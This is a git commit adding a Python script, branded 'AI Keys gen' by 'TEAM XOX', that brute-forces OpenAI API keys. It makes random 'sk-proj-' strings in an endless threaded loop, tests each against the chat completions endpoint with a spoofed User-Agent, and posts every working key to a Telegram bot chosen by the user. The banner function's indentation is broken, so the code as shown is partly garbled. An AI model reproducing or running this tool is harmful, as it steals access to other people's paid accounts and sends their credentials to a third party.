432c2faea766398f7e2e1019cd47155676f11b9d
xoxevilxD <xoxoakarsh@gmail.com>
2024-12-25 00:05:19 +0530

    Create main.py

---
+++ main.py
@@ -0,0 +1,83 @@
+import os
+try:
+  import requests
+  import json  
+  from random import choice as cc
+  from random import randint as rr
+  from string import ascii_letters as sos
+  from string import digits as bos
+  from rich.console import Console
+  from rich.table import Table
+  from rich.text import Text
+  import time
+  from concurrent.futures import ThreadPoolExecutor
+except:
+  os.system("pip install rich requests")
+  
+import requests
+import json
+import os
+from random import choice as cc
+from random import randint as rr
+from string import ascii_letters as sos
+from string import digits as bos
+from rich.console import Console
+from rich.table import Table
+from rich.text import Text
+import time
+from concurrent.futures import ThreadPoolExecutor
+console = Console()
+gg = 0
+bb = 0
+E = '\033[1;31m'
+X = '\033[1;33m'
+F = '\033[2;32m'
+M = '\x1b[1;37m'
+B = '\x1b[38;5;208m'
+memo = rr(100, 300)
+O = f'\x1b[38;5;{memo}m'
+def nx():
+    os.system("clear")
+    Banner = f"""{B}{E}=============================={B}
+|{F}[+] YouTube    : {B}| SOON
+|{F}[+] TeleGram   : {B} @team_xox
+|{F}[+] Instagram  : {B} SOON
+|{F}[+] Tool       : {B} AI Keys gen
+{E}==============================
+"""
+nx()
+    for mm in Banner.splitlines():
+        time.sleep(0.05)
+        print(mm)
+
+nx()
+token = input(f' {F}({M}1{F}) {M} Enter Token{F}  ' + O)
+print(X + ' ═════════════════════════════════  ')
+ID = input(f' {F}({M}2{F}) {M} Enter ID{F}  ' + O)
+def ChatGPT(key):
+    global gg, bb
+    total = gg + bb    
+    msg = "Hello"   
+    response = requests.post("https://api.openai.com/v1/chat/completions", json={"model": "gpt-3.5-turbo","messages": [{"role": "user","content": msg }]}, headers={'User-Agent': "Dart/3.0 (dart:io)",'Accept': "application/json",'Authorization': f"Bearer {key}",'Content-Type': "application/json; charset=utf-8"}).text 
+    table = Table(title=f"{O}Generate GPT Keys")
+    table.add_column("Type", justify="center", style="cyan", no_wrap=True)
+    table.add_column("Count", justify="center", style="magenta")
+    if "Hello! How can I assist you today?" in response or "content" in response or "choices" in response:
+        gg += 1
+        tlg = f"Good AI Key : {key}\nDev : TEAM XOX"
+        requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
+    else:
+        bb += 1
+    os.system('clear')
+    table.add_row("Good Keys", Text(str(gg), style="green"))
+    table.add_row("Bad Keys", Text(str(bb), style="red"))
+    table.add_row("Total", Text(str(total), style="yellow"))
+    table.add_row("Dev", "TEAM XOX")
+    console.print(table)
+def RandomKey(): 
+    with ThreadPoolExecutor(max_workers=2) as pool: 
+        while True:
+            key = "sk-proj-" + ''.join(cc(sos + bos) for _ in range(48))
+            pool.submit(ChatGPT, key)
+
+RandomKey()
